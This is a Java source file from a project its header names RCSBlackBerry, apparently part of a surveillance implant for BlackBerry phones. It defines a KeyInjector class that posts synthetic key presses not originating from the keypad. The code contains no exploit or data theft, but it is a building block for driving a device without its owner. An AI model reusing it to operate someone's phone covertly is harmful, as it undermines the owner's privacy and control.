//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.injection
 * File         : KeyInjector.java
 * Created      : 2-lug-2010
 * *************************************************/
package blackberry.injection;

import net.rim.device.api.system.Application;
import net.rim.device.api.system.EventInjector;
import net.rim.device.api.system.KeypadListener;
import net.rim.device.api.system.EventInjector.KeyCodeEvent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class KeyInjector.
 */
public class KeyInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("KeyInjector", DebugLevel.VERBOSE);

    //#endif
    /**
     * Press key.
     * 
     * @param key
     *            the key
     */
    public static void pressKey(final int key) {
        Application.getApplication().invokeLater(new Runnable() {

            public void run() {

                // Keypad.KEY_SEND
                final EventInjector.KeyCodeEvent pressKey = new EventInjector.KeyCodeEvent(
                        KeyCodeEvent.KEY_DOWN, (char) key,
                        KeypadListener.STATUS_NOT_FROM_KEYPAD);
                final EventInjector.KeyCodeEvent releaseKey = new EventInjector.KeyCodeEvent(
                        KeyCodeEvent.KEY_UP, (char) key,
                        KeypadListener.STATUS_NOT_FROM_KEYPAD);

                pressKey.post();
                releaseKey.post();
            }
        });
    }
}
